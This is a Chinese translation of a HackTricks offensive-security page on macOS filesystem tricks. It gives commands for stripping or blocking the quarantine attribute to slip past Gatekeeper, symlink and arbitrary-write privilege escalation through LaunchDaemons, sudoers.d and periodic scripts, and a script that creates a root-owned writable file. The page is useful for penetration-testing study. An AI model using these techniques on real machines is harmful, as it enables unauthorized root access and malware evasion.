# macOS FS 技巧

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想看到您的**公司在 HackTricks 中做广告**或**下载 PDF 版的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) 上**关注**我们。
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>

## POSIX 权限组合

**目录**中的权限：

* **读取** - 您可以**枚举**目录条目
* **写入** - 您可以**删除/写入**目录中的**文件**，并且您可以**删除空文件夹**。
* 但是，除非您对其具有写入权限，否则**无法删除/修改非空文件夹**。
* 除非您拥有它，否则**无法修改文件夹的名称**。
* **执行** - 您被**允许遍历**目录 - 如果您没有此权限，您将无法访问其中的任何文件，或任何子目录中的文件。

### 危险组合

**如何覆盖 root 拥有的文件/文件夹**，但：

* 路径中的一个父**目录所有者**是用户
* 路径中的一个父**目录所有者**是具有**写入访问权限**的**用户组**
* 一个用户**组**对**文件**具有**写入**访问权限

使用上述任何组合，攻击者可以**注入**一个**符号链接/硬链接**到预期路径，以获取特权任意写入。

### 文件夹根目录 R+X 特殊情况

如果**目录**中有**只有 root 具有 R+X 访问权限**的文件，那些文件对其他人**不可访问**。因此，如果存在一个漏洞允许**移动一个用户可读的文件**（由于该**限制**而无法读取），从该目录**到另一个目录**，则可能被滥用以读取这些文件。

示例：[https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## 符号链接 / 硬链接

如果一个特权进程正在写入**文件**，该文件可能被**低权限用户控制**，或者可能是由低权限用户**先前创建**的。用户只需通过符号链接或硬链接**将其指向另一个文件**，特权进程将写入该文件。

请查看其他部分，攻击者可能**滥用任意写入以提升权限**。

## .fileloc

具有**`.fileloc`**扩展名的文件可以指向其他应用程序或二进制文件，因此当打开它们时，将执行该应用程序/二进制文件。\
示例：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## 任意FD

如果你可以让一个**进程以高权限打开文件或文件夹**，你可以滥用**`crontab`**来打开`/etc/sudoers.d`中的文件，使用**`EDITOR=exploit.py`**，这样`exploit.py`将获得`/etc/sudoers`中文件的FD并滥用它。

例如：[https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## 避免隔离xattrs技巧

### 删除它
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable标志

如果文件/文件夹具有此不可变属性，则无法在其上放置xattr
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs挂载

**devfs**挂载**不支持xattr**，更多信息请参考[**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

此 ACL 阻止向文件添加 `xattrs`。
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble**文件格式会复制文件及其ACEs。

在[**源代码**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)中，可以看到存储在名为**`com.apple.acl.text`**的xattr中的ACL文本表示将被设置为解压后文件的ACL。因此，如果您将一个应用程序压缩成一个使用**AppleDouble**文件格式的zip文件，并且该文件格式具有防止其他xattr被写入的ACL... 那么隔离xattr 将不会被设置到该应用程序中：

查看[**原始报告**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)以获取更多信息。

要复制这一过程，首先需要获取正确的acl字符串：
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

并不是真的需要，但我还是留着以防万一：

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## 绕过代码签名

Bundle 包含文件 **`_CodeSignature/CodeResources`**，其中包含 **bundle** 中每个 **文件** 的 **哈希值**。请注意，CodeResources 的哈希值也被**嵌入在可执行文件中**，因此我们无法对其进行更改。

然而，有一些文件的签名不会被检查，这些文件在属性列表中具有省略键，如：
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
可以使用以下命令行计算资源的签名：

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## 挂载dmgs

用户可以挂载一个自定义的dmg，甚至可以覆盖一些现有文件夹。以下是如何创建一个带有自定义内容的自定义dmg包的方法：
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

通常 macOS 会通过与 `com.apple.DiskArbitrarion.diskarbitrariond` Mach 服务通信（由 `/usr/libexec/diskarbitrationd` 提供）来挂载磁盘。如果在 LaunchDaemons plist 文件中添加参数 `-d` 并重新启动，它将会将日志存储在 `/var/log/diskarbitrationd.log` 中。\
然而，可以使用诸如 `hdik` 和 `hdiutil` 这样的工具直接与 `com.apple.driver.DiskImages` kext 通信。

## 任意写入

### 定期 sh 脚本

如果您的脚本可以被解释为 **shell 脚本**，则可以覆盖 **`/etc/periodic/daily/999.local`** shell 脚本，该脚本将每天触发一次。

您可以使用以下命令**伪造**执行此脚本：**`sudo periodic daily`**

### 守护程序

编写一个任意的 **LaunchDaemon**，如 **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**，其中包含执行任意脚本的 plist，如下所示：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### Sudoers File

如果你有**任意写入权限**，你可以创建一个文件在文件夹**`/etc/sudoers.d/`**里，授予自己**sudo**权限。

### PATH files

文件**`/etc/paths`** 是一个主要用来设置PATH环境变量的地方。你必须是root才能覆盖它，但如果一个来自**特权进程**的脚本在执行一些**没有完整路径的命令**，你也许可以通过修改这个文件来**劫持**它。

你也可以在**`/etc/paths.d`**里写入文件来加载新的文件夹到`PATH`环境变量中。

## 生成其他用户可写文件

这将生成一个属于root但我可以写入的文件（[**代码在这里**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)）。这也可能作为权限提升：
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX 共享内存

**POSIX 共享内存** 允许 POSIX 兼容操作系统中的进程访问一个共享内存区域，相比其他进程间通信方法，可以实现更快的通信。它涉及使用 `shm_open()` 创建或打开一个共享内存对象，使用 `ftruncate()` 设置其大小，并使用 `mmap()` 将其映射到进程的地址空间。进程可以直接从这个内存区域读取和写入数据。为了管理并发访问并防止数据损坏，通常会使用诸如互斥锁或信号量等同步机制。最后，进程使用 `munmap()` 和 `close()` 取消映射和关闭共享内存，并可选择使用 `shm_unlink()` 删除内存对象。在需要多个进程快速访问共享数据的环境中，这种系统特别适用于高效快速的进程间通信。

<details>

<summary>生产者代码示例</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>消费者代码示例</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS 受保护描述符

**macOS 受保护描述符**是 macOS 中引入的一项安全功能，旨在增强用户应用程序中的**文件描述符操作**的安全性和可靠性。这些受保护描述符提供了一种将特定限制或“保护”与文件描述符关联起来的方式，这些限制由内核强制执行。

该功能特别有助于防止某些类别的安全漏洞，如**未经授权的文件访问**或**竞争条件**。这些漏洞会在例如一个线程正在访问一个文件描述符时，给**另一个易受攻击的线程访问权限**，或者当一个文件描述符被**易受攻击的子进程继承**时发生。与此功能相关的一些函数包括：

* `guarded_open_np`: 使用保护打开一个文件描述符
* `guarded_close_np`: 关闭它
* `change_fdguard_np`: 更改描述符上的保护标志（甚至移除保护）

## 参考资料

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想看到您的**公司在 HackTricks 中做广告**或**下载 PDF 版本的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** 上**关注我们。
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
